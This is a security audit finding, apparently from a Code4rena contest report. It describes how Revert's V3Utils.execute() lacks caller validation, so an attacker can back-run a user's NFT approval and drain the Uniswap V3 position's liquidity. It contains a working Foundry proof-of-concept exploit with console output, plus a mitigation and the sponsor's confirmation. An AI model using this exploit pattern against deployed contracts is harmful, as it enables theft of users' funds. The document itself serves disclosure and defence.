@@ -1,0 +1,28 @@
+[H-04]V3Utils.execute()does not have caller validation, leading to stolen NFT positions from users
+Submitted by0xjuan, also found byCaeraDenoir,santiellena,Tigerfrake,Timenov, andnovamanbg
+When a user wants to useV3Utils, one of the flows stated by the protocol is as follows:
+TX1: User callsNPM.approve(V3Utils, tokenId).TX2: User callsV3Utils.execute()with specific instructions.
+Note that this can’t be done in one transaction since in TX1, the NPM has to be called directly by the EOA which owns the NFT. Thus, theV3Utils.execute()would have to be called in a subsequent transaction.
+Now this is usually a safe design pattern, but the issue is thatV3Utils.execute()does not validate the owner of the UniV3 Position NFT that is being handled. This allows anybody to provide arbitrary instructions and callV3Utils.execute()once the NFT has been approved in TX1.
+A malicious actor provide instructions that include the following:
+WhatToDo = WITHDRAW_AND_COLLECT_AND_SWAP.recipient = malicious_actor_address.liquidity = total_position_liquidity.
+This would collect all liquidity from the position that was approved, and send it to the malicious attacker who didn’t own the position.
+Impact
+The entire liquidity of a specific UniswapV3 liquidity provision NFT can be stolen by a malicious actor, with zero cost.
+Proof of Concept
+This foundry test demonstrates how an attacker can steal all the liquidity from a UniswapV3 position NFT that is approved to the V3Utils contract.
+To run the PoC:
+Add the following foundry test totest/integration/V3Utils.t.sol.Run the commandforge test --via-ir --mt test_backRunApprovals_toStealAllFunds -vvin the terminal.
+functiontest_backRunApprovals_toStealAllFunds()external{addressattacker=makeAddr("attacker");uint256daiBefore=DAI.balanceOf(attacker);uint256usdcBefore=USDC.balanceOf(attacker);(,,,,,,,uint128liquidityBefore,,,,) =NPM.positions(TEST_NFT_3);console.log("Attacker's DAI Balance Before: %e",daiBefore);console.log("Attacker's USDC Balance Before: %e",usdcBefore);console.log("Position #%s's liquidity Before: %e",TEST_NFT_3,liquidityBefore);// Malicious instructions used by attacker:V3Utils.Instructionsmemorybad_inst=V3Utils.Instructions(V3Utils.WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,address(USDC),0,0,0,0,"",0,0,"",type(uint128).max,type(uint128).max,0,0,0,liquidityBefore,// Attacker chooses to withdraw 100% of the position's liquidity0,0,block.timestamp,attacker,// Recipient address of tokensaddress(0),false,"","");// User approves V3Utils, planning to execute nextvm.prank(TEST_NFT_3_ACCOUNT);NPM.approve(address(v3utils),TEST_NFT_3);console.log("\n--ATTACK OCCURS--\n");// User's approval gets back-ranvm.prank(attacker);v3utils.execute(TEST_NFT_3,bad_inst);uint256daiAfter=DAI.balanceOf(attacker);uint256usdcAfter=USDC.balanceOf(attacker);(,,,,,,,uint128liquidityAfter,,,,) =NPM.positions(TEST_NFT_3);console.log("Attacker's DAI Balance After: %e",daiAfter);console.log("Attacker's USDC Balance After: %e",usdcAfter);console.log("Position #%s's liquidity After: %e",TEST_NFT_3,liquidityAfter);}
+Console output:
+Ran 1 test for test/integration/V3Utils.t.sol:V3UtilsIntegrationTest[PASS] test_backRunApprovals_toStealAllFunds() (gas: 351245)Logs:Attacker's DAI Balance Before: 0e0Attacker's USDC Balance Before: 0e0Position #4660's liquidity Before: 1.2922419498089422291e19--ATTACK OCCURS--Attacker's DAI Balance After: 4.2205702812280886591005e22Attacker's USDC Balance After: 3.5931648355e10Position #4660's liquidity After: 0e0Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17sRan 1 test suite in 1.17s: 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Recommended Mitigation Steps
+Add a check to ensure that only the owner of the position can callV3Utils.execute.
+Note the fix also checks for the case where a user may have transferred the token into theV3Utils. In that case it is fine thatmsg.sender != tokenOwner, sincetokenOwnerwould then be the V3Utils contract itself.
+function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {+       address tokenOwner = nonfungiblePositionManager.ownerOf(tokenId);+       if (tokenOwner != msg.sender && tokenOwner != address(this)) {+           revert Unauthorized();+       }/* REST OF CODE */}
+Assessed type
+Access Control
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRhere- refactoring to make all transformers properly check caller permission.
+Status:Mitigation confirmed. Full details in reports fromthank_you,ktgandb0g0.
